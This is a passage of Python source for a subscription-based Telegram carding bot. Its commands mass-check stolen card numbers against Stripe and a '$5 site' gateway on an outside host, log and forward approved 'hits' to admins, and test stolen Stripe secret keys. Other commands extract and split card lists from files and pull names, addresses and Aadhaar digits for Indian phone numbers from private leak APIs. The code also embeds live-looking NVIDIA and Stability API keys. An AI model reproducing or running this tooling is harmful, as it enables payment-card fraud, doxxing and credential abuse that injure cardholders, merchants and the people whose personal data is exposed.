        status_msg = bot.reply_to(message, f"↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{cc}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Stripe Auth 2</i>\n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>", parse_mode='HTML')

        def check_card():
            try:
                result = check_au_cc(cc)
                result['user_id'] = message.from_user.id
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['mass'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mass'))
def handle_mass(message):
    # Check if user is allowed to use the bot in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    # Confirm if the checker is active
    if not confirm_time():
        bot.reply_to(message, "❌ The checker is currently inactive. Follow @spydil for updates!")
        return

    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Parse input cards
    try:
        cards_text = None
        command_parts = message.text.split()
        
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after the command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return

        # Determine maximum card limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")

        # Check user credits for non-subscribed users
        if not is_user_subscribed(message.from_user.id):
            if not check_user_credits(message.from_user.id, len(cards)):
                remaining = get_remaining_credits(message.from_user.id)
                bot.reply_to(message, f"❌ Not enough credits. You need {len(cards)} credits but only have {remaining} left today. Subscribe or wait for the daily reset.")
                return
            deduct_credits(message.from_user.id, len(cards))

        # Start processing cards
        start_time = time.time()
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')

        def check_cards():
            try:
                results = []
                for idx, card in enumerate(cards, 1):
                    try:
                        # Call the `check_au_cc` function to process each card
                        result = check_au_cc(card)
                        results.append(result)
                    except Exception as e:
                        results.append({
                            "status": "ERROR",
                            "card": card,
                            "message": str(e),
                            "brand": "UNKNOWN",
                            "country": "UNKNOWN 🌐",
                            "type": "UNKNOWN",
                            "gateway": "Stripe Auth 2"
                        })

                    # Update message in real-time
                    processing_time = time.time() - start_time
                    response_text = format_mchk_response(results, len(cards), processing_time, checked=idx)
                    bot.edit_message_text(chat_id=message.chat.id,
                                          message_id=status_msg.message_id,
                                          text=response_text,
                                          parse_mode='HTML')

                # Final update with all results
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time, checked=len(results))
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}",
                                      parse_mode='HTML')

        threading.Thread(target=check_cards).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['sk'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sk'))
def handle_sk_check(message):
    # Check if the bot usage is allowed
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    # Check flood control
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands.")
        return

    try:
        # Parse input
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /sk <sk_key>")
            return
        sk_key = parts[1]

        # Notify user of processing
        status_msg = bot.reply_to(message, "🔍 Checking SK key...")

        # Define function to check SK key
        def check_sk():
            try:
                headers = {"Authorization": f"Bearer {sk_key}"}
                r = requests.get("https://api.stripe.com/v1/account", headers=headers, timeout=20)

                # Response formatting based on API response
                if r.status_code == 200:
                    data = r.json()
                    msg = f"""
┏━━━━━━━⍟
┃ SK Key Info
┗━━━━━━━━━━━⊛

✧ Name        : <code>{data.get("display_name", "N/A")}</code>
✧ Business    : <code>{data.get("business_name", "N/A")}</code>
✧ Website     : <code>{data.get("business_url", "N/A")}</code>
✧ Email       : <code>{data.get("email", "N/A")}</code>
✧ Country     : <code>{data.get("country", "N/A")}</code>
✧ Currency    : <code>{data.get("default_currency", "N/A").upper()}</code>
✧ Live Mode   : <code>{"✅" if data.get("livemode") else "❌"}</code>
✧ Status      : <b>✅ LIVE</b>
"""
                elif r.status_code == 401:
                    msg = f"""
┏━━━━━━━⍟
┃ SK Key Info
┗━━━━━━━━━━━⊛

✧ Status      : <b>❌ DEAD / INVALID</b>
✧ Checked Key : <code>{sk_key}</code>
"""
                else:
                    msg = f"""
┏━━━━━━━⍟
┃ SK Key Info
┗━━━━━━━━━━━⊛

✧ Status      : ⚠️ UNKNOWN ({r.status_code})
✧ Checked Key : <code>{sk_key}</code>
"""

                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=msg.strip(),
                                      parse_mode='HTML')
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ Error checking key: <code>{str(e)}</code>",
                                      parse_mode="HTML")

        threading.Thread(target=check_sk).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

import requests
from datetime import datetime

# === TERA MAIN + FALLBACK API FUNCTION ===
def get_phone_info(number):
    # Clean number first – Indian 10-digit
    number = str(number).strip().replace(" ", "").lstrip("+").lstrip("91").lstrip("0")
    
    # URLs with type=mobile for first API
    urls = [
        f"https://splexxo-bhai.vercel.app/api/seller?type=mobile&term={number}&key=SPLEXXO",  # ← Yeh fix: type & term use kiya
        f"https://rushvx.tiiny.io/?key=RushVx&number={number}"  # Fallback same
    ]

    for url in urls:
        try:
            headers = {"User-Agent": "Mozilla/5.0"}
            r = requests.get(url, headers=headers, timeout=10)
            if r.status_code == 200:
                data = r.json()
                if data.get("success") in (True, "true", "True") or data.get("status") == "success":
                    return data
        except:
            continue
    return None

# === BOT COMMAND ===
@bot.message_handler(commands=['true'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.true'))
def handle_truecaller_check(message):
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            bot.reply_to(message, "Bhai number daal na → /true 6390032761")
            return

        phone = args[1].strip().replace(" ", "")
        
        # ←← FIXED VALIDATION (ye galti thi pehle) ←←
        if not phone.replace("+", "").isdigit():
            bot.reply_to(message, "Number galat hai bhai, sirf digits + optional +91")
            return

        # +91 force add kar dete hain display ke liye
        if not phone.startswith("+"):
            phone = "+91" + phone.lstrip("0")

        bot.send_chat_action(message.chat.id, 'typing')
        raw_result = get_phone_info(phone.lstrip("+").lstrip("91").lstrip("0"))   # clean Indian number bhejegaone.lstrip("+"))

        now = datetime.now().strftime("%d-%m-%Y %H:%M:%S")

        # Agar kuch nahi mila
        if not raw_result or raw_result.get("success") not in (True, "true", "True"):
            output = f"""┏━━━━━━━⍟
┃ TRUECALLER / DATABASE SEARCH
┗━━━━━━━━━━━⊛

✆ Number      : <code>{phone}</code>
✆ Formatted   : <code>+91 {phone[-10:-5]} {phone[-5:]}</code>

⚠ Result      : <b>NO RECORDS FOUND</b>

   • Dono APIs se koi data nahi mila

⏰ Searched    : <code>{now}</code>
🔥 Source      : Private API + Fallback
"""
            bot.send_message(message.chat.id, output, parse_mode="HTML", disable_web_page_preview=True)
            return

        # Data extract – dono formats support
        if "result" in raw_result and isinstance(raw_result["result"], list) and raw_result["result"]:
            rec = raw_result["result"]
            d1 = rec[0]
            d2 = rec[1] if len(rec) > 1 else {}
        else:
            d1 = raw_result.get("data1") or {}
            d2 = raw_result.get("data2") or {}

        name1 = (d1.get("name") or "").strip() or "Not Found"
        name2 = (d2.get("name") or "").strip() or "Not Found"
        father = " | ".join(filter(None, [d1.get("father_name",""), d2.get("father_name","")])) or "Not Found"
        email = d1.get("email") or d2.get("email") or "Not Found"
        circle = (d1.get("circle") or d2.get("circle") or "Not Found").replace("VODA", "Vodafone Idea").replace("UPE", "UP East").replace("UPE", "UP East")
        alt1 = d1.get("alt_mobile") or "N/A"
        alt2 = d2.get("alt_mobile") or "N/A"

        def clean_addr(x):
            if not x: return "Not Found"
            return " ".join(str(x).replace("!", " ").split()).title()

        addr1 = clean_addr(d1.get("address"))
        addr2 = clean_addr(d2.get("address"))

        output = f"""┏━━━━━━━⍟
┃ Phone Number Info - FULL RAW
┗━━━━━━━━━━━⊛

✆ Number        : <code>{phone}</code>
✆ Intl          : <code>+91 {phone[-10:-5]} {phone[-5:]}</code>

👤 Name          : 
   • <code>{name1}</code>
   • <code>{name2}</code>

👨 Father/Husband : <code>{father}</code>

📧 Email         : <code>{email}</code>

🔄 Alternate     : <code>{alt1}</code>  ↔  <code>{alt2}</code>

📶 Carrier       : <code>{circle}</code>

🏠 Address 1     : 
   <code>{addr1}</code>

🏠 Address 2     : 
   <code>{addr2}</code>

🆔 Aadhaar (last 4) : <code>{str(d1.get("id_number",""))[-4:] or "N/A"}</code>

⏰ Searched      : <code>{now}</code>

🔥 Source        : <b>Splexxo + RushVx API</b>
"""

        bot.send_message(message.chat.id, output, parse_mode="HTML", disable_web_page_preview=True)

    except Exception as e:
        bot.reply_to(message, f"Error ho gaya: {str(e)}")

import io        
@bot.message_handler(commands=['open'])
def open_txt_file(message):
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "❌ Please reply to a text file.")
        return

    try:
        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        text_content = downloaded_file.decode('utf-8')

        # Extract CCs
        ccs = re.findall(r'\d{12,19}[\|\:\/\s]\d{1,2}[\|\:\/\s]\d{2,4}[\|\:\/\s]\d{3,4}', text_content)
        if not ccs:
            bot.reply_to(message, "❌ No CCs found in this file.")
            return

        first_30 = ccs[:30]
        formatted = "\n".join(cc.replace(" ", "|").replace("/", "|").replace(":", "|") for cc in first_30)

        bot.send_message(message.chat.id, f"✅ Found {len(ccs)} CCs.\n\nHere are the first {len(first_30)}:\n<code>{formatted}</code>", parse_mode='HTML')

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['split'])
def split_txt_file(message):
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, "❌ Please reply to a text file.")
        return

    try:
        args = message.text.split()
        if len(args) < 2 or not args[1].isdigit():
            bot.reply_to(message, "❌ Provide the number of parts. Example: /split 5")
            return
        parts = int(args[1])
        if parts <= 0:
            bot.reply_to(message, "❌ Number of parts must be greater than 0.")
            return

        file_info = bot.get_file(message.reply_to_message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        text_content = downloaded_file.decode('utf-8')

        # Extract CCs
        ccs = re.findall(r'\d{12,19}[\|\:\/\s]\d{1,2}[\|\:\/\s]\d{2,4}[\|\:\/\s]\d{3,4}', text_content)
        if not ccs:
            bot.reply_to(message, "❌ No CCs found in this file.")
            return

        chunk_size = (len(ccs) + parts - 1) // parts
        chunks = [ccs[i:i+chunk_size] for i in range(0, len(ccs), chunk_size)]

        for idx, chunk in enumerate(chunks):
            chunk_text = "\n".join(cc.replace(" ", "|").replace("/", "|").replace(":", "|") for cc in chunk)
            output = io.BytesIO(chunk_text.encode('utf-8'))
            output.name = f'part_{idx+1}.txt'
            bot.send_document(message.chat.id, output)

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def chat_with_nvidia(prompt):
    url = "https://integrate.api.nvidia.com/v1/chat/completions"
    headers = {
        "Authorization": "Bearer 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",
        "Content-Type": "application/json"
    }
    payload = {
        "model": "nvidia/llama3-chatqa-1.5-8b",
        "messages": [{"role": "user", "content": prompt}],
        "temperature": 0.7
    }
    try:
        response = requests.post(url, headers=headers, json=payload)
        data = response.json()
        return data["choices"][0]["message"]["content"]
    except Exception as e:
        return "Error: Unable to contact NVIDIA API."

@bot.message_handler(commands=['ai'])
def handle_ai(message):
    try:
        # Extract the prompt after /ai
        prompt = message.text[len('/ai'):].strip()

        if not prompt:
            bot.reply_to(message, "❌ Please type something after /ai. Example: /ai Tell me a joke!")
            return

        waiting_msg = bot.reply_to(message, "🧠 Thinking...")

        ai_response = chat_with_nvidia(prompt)

        # If response includes code blocks (```...```), handle them specially
        if "```" in ai_response:
            # Telegram Markdown supports code blocks
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=waiting_msg.message_id,
                text=ai_response,
                parse_mode="Markdown"
            )
        else:
            # Normal message
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=waiting_msg.message_id,
                text=f"🧠{ai_response}",
                parse_mode="HTML"
            )

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def schedule_daily_hits():
    # Run every day at 8:00 AM KSA time
    schedule.every().day.at("05:00").do(send_hits_to_admins)  # 5:00 UTC = 8:00 KSA (UTC+3)
    
    while True:
        schedule.run_pending()
        time.sleep(60)

# Start background scheduler thread
scheduler_thread = threading.Thread(target=schedule_daily_hits)
scheduler_thread.daemon = True
scheduler_thread.start()

def check_sitebase5_cc(cc):
    try:
        # Normalize card
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        parts = [p.strip() for p in card.split('|') if p.strip()]

        if len(parts) != 4:
            return {
                'status': 'ERROR',
                'card': card,
                'message': '❌ Invalid format. Please use CC|MM|YYYY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Site Base [$5]'
            }

        cc_num, mm, yy, cvv = parts

        if not cc_num.isdigit() or not mm.isdigit() or not yy.isdigit() or not cvv.isdigit():
            return {
                'status': 'ERROR',
                'card': card,
                'message': '❌ Card must be numeric.',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Site Base [$5]'
            }

        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        # BIN lookup
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🌐'
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
                brand = bin_info.get('brand', 'UNKNOWN')
                country_name = bin_info.get('country_name', 'UNKNOWN')
                country_flag = bin_info.get('country_flag', '🌐')
                card_type = bin_info.get('type', 'UNKNOWN')
                bank = bin_info.get('bank', 'UNKNOWN')
        except Exception as e:
            print(f"BIN Lookup Error: {e}")

        # API Call
        url = f"https://site5-eldd.onrender.com/gate=pipeline/key=whoami/cc={formatted_cc.replace('|', '%7C')}"
        response = requests.get(url, timeout=60)
        result = response.json()

        real_status = result.get("status", "DECLINED").upper()
        real_message = result.get("response", "Unknown response")

        # Write HITS if approved
        if real_status == "APPROVED":
            with open("HITS.txt", "a") as f:
                f.write(formatted_cc + "\n")

        return {
            'status': real_status,
            'card': formatted_cc,
            'message': real_message,
            'brand': brand,
            'country': f"{country_name} {country_flag}",
            'type': card_type,
            'gateway': 'Site Base [$5]'
        }

    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f"❌ Error: {str(e)}",
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Site Base [$5]'
        }

@bot.message_handler(commands=['mx'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mx'))
def handle_mx(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return



    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract target text (message or reply)
        target_text = message.text
        if message.reply_to_message:
            target_text = message.reply_to_message.text

        # Extract all potential CCs
        cc_pattern = r'\b(?:\d[ -]*?){13,16}[|:/\- ]\d{1,2}[|:/\- ]\d{2,4}[|:/\- ]\d{3,4}\b'
        matches = re.findall(cc_pattern, target_text)

        if matches:
            # Clean and format the first valid CC
            valid_cc = None
            for match in matches:
                parts = re.split(r'[|:/\- ]+', match)
                if len(parts) == 4:
                    cc, mm, yy, cvv = parts
                    if len(yy) == 2:
                        yy = "20" + yy
                    valid_cc = f"{cc}|{mm}|{yy}|{cvv}"
                    break
            
            if valid_cc:
                start_time = time.time()
                user_full_name = message.from_user.first_name
                if message.from_user.last_name:
                    user_full_name += " " + message.from_user.last_name

                status_msg = bot.reply_to(message, 
                                          f"↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{valid_cc}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Site Base [5$]</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>",
                                          parse_mode='HTML')

                def check_card():
                    try:
                        result = check_sitebase5_cc(valid_cc)
                        result['user_id'] = message.from_user.id  # Add user ID to the result
                        processing_time = time.time() - start_time

                        if processing_time < 10:
                            time.sleep(10 - processing_time)
                            processing_time = 10

                        response_text = format_single_response(result, user_full_name, processing_time)

                        bot.edit_message_text(chat_id=message.chat.id,
                                              message_id=status_msg.message_id,
                                              text=response_text,
                                              parse_mode='HTML')

                        if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                            try:
                                bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                            except Exception as e:
                                print(f"[Auto Forward Error - mx] {e}")

                    except Exception as e:
                        bot.edit_message_text(chat_id=message.chat.id,
                                              message_id=status_msg.message_id,
                                              text=f"❌ An error occurred: {str(e)}")

                threading.Thread(target=check_card).start()
                return  # Stop further execution after finding and processing valid CC

        # No valid CC found, send error message
        bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).", parse_mode="HTML")

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['mmx'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mmx'))
def handle_mmx(message):
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return



    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return

    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in correct format (CC|MM|YY|CVV).")
            return

        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT

        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')

        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        card_start_time = time.time()
                        result = check_sitebase5_cc(card)

                        processing_time = time.time() - card_start_time
                        if processing_time < 10:
                            time.sleep(10 - processing_time)

                        results.append(result)

                        total_processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), total_processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                              message_id=status_msg.message_id,
                                              text=response_text,
                                              parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Site Base [$5]'
                        })

                        total_processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), total_processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                              message_id=status_msg.message_id,
                                              text=response_text,
                                              parse_mode='HTML')

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')

        threading.Thread(target=check_cards).start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

@bot.message_handler(commands=['lk'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.lk'))
def handle_lk(message):
    # Restrict usage for non-subscribed users in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs..")
        return

    # Restrict usage in unapproved groups
    if message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot. Send the group username and chat ID to @spydil for approval.")
        return

    try:
        # Extract card from command or reply
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                if message.reply_to_message:
                    card_input = message.reply_to_message.text.strip()
                else:
                    bot.reply_to(message, "❌ Invalid format. Use /lk CC|MM|YYYY|CVV or .lk CC|MM|YY|CVV")
                    return
            else:
                card_input = parts[1]
        else:
            card_input = message.text[4:].strip()

        # Validate card input format
        card_pattern = r'^(\d{13,16})[|](\d{1,2})[|](\d{2,4})[|](\d{3,4})$'
        match = re.match(card_pattern, card_input)
        if not match:
            bot.reply_to(message, "❌ Invalid format. Use CC|MM|YYYY|CVV or CC|MM|YY|CVV")
            return

        # Extract components
        card_number, month, year, cvv = match.groups()
        month = month.zfill(2)  # Ensure month is 2 digits
        if len(year) == 2:  # Convert 2-digit year to 4-digit year
            year = "20" + year

        # Validate card number length
        if len(card_number) < 13 or len(card_number) > 19:
            bot.reply_to(message, "❌ Invalid card number. Card number must be between 13 and 19 digits.")
            return

        # Check if card number is valid using the Luhn algorithm
        def luhn_algorithm(card_num):
            sum_ = 0
            alt = False
            for digit in reversed(card_num):
                d = int(digit)
                if alt:
                    d *= 2
                    if d > 9:
                        d -= 9
                sum_ += d
                alt = not alt
            return sum_ % 10 == 0

        if not luhn_algorithm(card_number):
            bot.reply_to(message, "❌ Card number is invalid based on the Luhn algorithm.")
            return

        # Validate month and year
        if int(month) < 1 or int(month) > 12:
            bot.reply_to(message, "❌ Invalid expiration month. Please provide a valid month (01-12).")
            return

        current_year = datetime.now().year
        current_month = datetime.now().month
        if int(year) < current_year or (int(year) == current_year and int(month) < current_month):
            bot.reply_to(message, "❌ The card has expired.")
            return

        # Extract BIN (first 6 digits)
        bin_number = card_number[:6]

        # Fetch BIN details
        status_msg = bot.reply_to(message, f"🔍 Checking BIN {bin_number}... Please wait.")
        try:
            response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
            if response.status_code == 200:
                bin_data = response.json()
                issuing_bank = bin_data.get('bank', 'N/A')
                card_type = bin_data.get('type', 'N/A')
                card_brand = bin_data.get('brand', 'N/A')
                country = bin_data.get('country_name', 'N/A')
                flag = bin_data.get('country_flag', '🌐')

                # Format the response
                reply = f"""
┏━━━━━━━⍟
┃ 𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽 ✅
┗━━━━━━━━━━━⊛

❖ 𝗖𝗔𝗥𝗗 ➳ <code>{card_number}</code>
❖ 𝗩𝗔𝗟𝗜𝗗 ➳ ✅
❖ 𝗘𝗫𝗣𝗜𝗥𝗬 ➳ {month}/{year}

❖ 𝗕𝗜𝗡 ➳ <code>{bin_number}</code>
❖ 𝗕𝗔𝗡𝗞 ➳ {issuing_bank}
❖ 𝗕𝗥𝗔𝗡𝗗 ➳ {card_brand}
❖ 𝗧𝗬𝗣𝗘 ➳ {card_type}
❖ 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ➳ {country} {flag}
"""
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=reply,
                                      parse_mode='HTML')
            else:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ Could not retrieve BIN details for {bin_number}.")
        except Exception as e:
            bot.edit_message_text(chat_id=message.chat.id,
                                  message_id=status_msg.message_id,
                                  text=f"❌ Error fetching BIN details: {str(e)}")

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['img'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.img'))
def handle_img(message):
    # Restrict bot usage in DMs for unauthorized users
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return

    # Extract prompt from command
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        bot.reply_to(message, "❌ Usage: /img <prompt>")
        return

    prompt = command_parts[1]

    # Notify user about image generation
    status_msg = bot.reply_to(message, f"🔍 Generating image for: <code>{prompt}</code>", parse_mode="HTML")

    # Function to generate image using Stability AI API
    def generate_image():
        try:
            api_key = "sk-9tonJ6V2D0q65SVMDULtMExuRrcM8cLb3JMuDBAN5TpvJX1Q"
            url = "https://api.stability.ai/v2beta/stable-image/generate/ultra"
            headers = {
                "Authorization": f"Bearer {api_key}",
                "Accept": "image/*",
            }
            data = {
                "prompt": prompt,
                "output_format": "webp",  # can be png, jpeg, webp
            }
            files = {'file': ('', '')}

            response = requests.post(url, headers=headers, data=data, files=files)

            if response.status_code == 200:
                # Save the generated image locally
                file_name = f"{prompt.replace(' ', '_')}.webp"
                with open(file_name, "wb") as f:
                    f.write(response.content)

                # Delete "Generating" message and send the image with a caption
                bot.delete_message(chat_id=message.chat.id, message_id=status_msg.message_id)
                bot.send_photo(
                    chat_id=message.chat.id,
                    photo=open(file_name, "rb"),
                    caption=(
                        f"🖼️ Image generated using Stability AI\n\n"
                        f"✧ Prompt: <code>{prompt}</code>\n"
                        f"✧ Model: Void AI v1 Beta\n"
                        f"✧ Generated by: @{bot.get_me().username}\n"
                    ),
                    parse_mode="HTML"
                )
            else:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    text=f"❌ Failed to generate image: {response.status_code} - {response.text}",
                    parse_mode="HTML"
                )

        except Exception as e:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                text=f"❌ Error generating image: {str(e)}",
                parse_mode="HTML"
            )

    threading.Thread(target=generate_image).start()

@bot.message_handler(commands=['prochk'])
def proxy_checker(message):
    # Restrict usage in DMs for non-subscribers
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is locked in DMs. Join our group @voidxup or subscribe to use it in private.")
        return

    # Restrict usage in unapproved groups
